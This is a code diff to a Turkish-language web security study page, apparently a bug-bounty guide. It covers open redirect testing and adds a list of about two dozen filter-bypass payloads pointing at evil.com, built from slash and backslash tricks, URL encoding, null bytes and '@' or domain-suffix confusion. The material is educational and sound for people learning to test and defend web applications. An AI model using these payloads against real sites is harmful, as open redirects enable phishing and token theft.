@@ -2174,7 +2174,7 @@ Body: { "email": "victim@target.com" }</pre>
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 1: Parametre Taraması:</strong> <code>?redirect=</code>, <code>?next=</code>, <code>?target=</code>, <code>?url=</code>, <code>?continue=</code>, <code>?returnTo=</code> gibi parametreleri arayın. Otomatik tarama için <code>ParamSpider</code> veya <code>waybackurls</code> çıktısını grepleyin.</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 2: Temel PoC:</strong> Parametre değerine <code>https://google.com</code> gibi bir harici URL verip yönlenip yönlenmediğini kontrol edin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Protokol Trick:</strong> Parametre değerine <code>//google.com</code> veya <code>/%5C/google.com</code> verin. Filtre sadece "http" veya "https" kontrolü yapıyorsa bu atlatma çalışabilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım 3: Protokol Trick:</strong> Parametre değerine <code>//google.com</code> veya <code>/\\/google.com</code> verin. Filtre sadece "http" veya "https" kontrolü yapıyorsa bu atlatma çalışabilir.</li>
             </ul>`
           },
           {
@@ -2199,6 +2199,57 @@ Body: { "email": "victim@target.com" }</pre>
             <pre>https://hedefsite.com/goto?path=/%5cevil.com</pre>
         </li>
     </ul>`
+          },
+          {
+            title: 'Gelişmiş Bypass Payload Listesi',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">1. Slash (/) ve Backslash (\\) Manipülasyonları</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">///evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/\\/\\/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//\\\\evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">\\\\/..\\\\/evil.com</code>
+                    </div>
+                </li>
+                
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">2. URL Encoding Teknikleri</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2F/evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%5Cevil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%2f%2fevil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%09/evil.com (Tab)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%20/evil.com (Space)</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">%00/evil.com (Null)</code>
+                    </div>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">3. Nokta (.) ve Domain Doğrulama Hataları</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://www.google.com.evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">https://evil.com/google.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://evil.com?google.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http://google.com@evil.com</code>
+                    </div>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <strong style="color:var(--muted);display:block;margin-bottom:8px;">4. Diğer Karışık Bypass Örnekleri</strong>
+                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//https://evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">http:evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com/</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//evil.com//</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">/.evil.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">//google%00.com</code>
+                        <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">&lt;&gt;//evil.com</code>
+                    </div>
+                </li>
+            </ul>`
           }
         ]
       },
@@ -5303,4 +5354,3 @@ view</textarea>
 </body>
 
 </html>
-
